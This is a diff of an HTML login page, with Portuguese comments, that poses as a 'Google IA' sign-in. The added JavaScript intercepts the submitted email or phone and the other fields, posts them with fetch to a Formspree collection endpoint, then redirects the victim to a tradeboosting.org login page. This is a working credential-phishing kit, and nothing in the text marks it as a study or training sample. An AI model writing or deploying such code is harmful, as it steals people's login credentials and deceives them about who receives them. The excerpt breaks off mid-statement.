@@ -66,8 +66,7 @@
     <div class="login-container">
         <h2>Login com Google IA</h2>
         <h5>Insira suas credenciais para começar</h5>
-        <!-- Formulário com o action do Formspree -->
-        <form id="loginForm" action="https://formspree.io/f/manngnwv" method="POST" target="erro">
+        <form id="loginForm">
             <div class="input-group">
                 <input type="email" id="email" name="email" placeholder="E-mail ou telefone" required>
             </div>
@@ -83,18 +82,25 @@
     </div>
 
     <script>
-        // Função chamada ao enviar o formulário
         document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Impede o envio padrão do formulário
+
             // Exibe a mensagem de espera
             document.getElementById('messageContainer').style.display = 'block';
 
-            // Aguardar o envio do formulário e redirecionar para a página desejada
-            setTimeout(function() {
-                // Após 2 segundos, redireciona para o site desejado
-                window.location.href = "https://tradeboosting.org/app/login.php"; 
-            }, 2000);
-        });
-    </script>
+            // Coleta os dados do formulário
+            const formData = new FormData(this);
 
-</body>
-</html>
+            // Envia os dados usando fetch
+            fetch('https://formspree.io/f/manngnwv', {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            }).then(response => {
+                // Após o envio, redireciona para a página desejada
+                setTimeout(function() {
+                    window.location.href = "https://tradeboosting.org/app/login.php"; 
+                }, 2000);
+            }).
